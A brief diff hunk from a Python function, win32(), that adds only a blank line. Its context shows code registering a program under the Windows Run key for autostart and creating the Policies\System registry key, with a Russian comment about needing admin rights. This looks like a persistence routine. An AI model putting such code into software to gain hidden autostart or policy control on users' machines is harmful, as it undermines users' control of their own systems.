@@ -12,6 +12,7 @@ def win32():
     tmp = reg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
     winreg.SetValue(tmp, None, reg.REG_SZ, address)
     winreg.CloseKey(tmp)
+    
     # Создаем sub_key System, т.к. обычно ее нет (на этом этапе нужны права администратора...)
     winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Policies\\System")
     
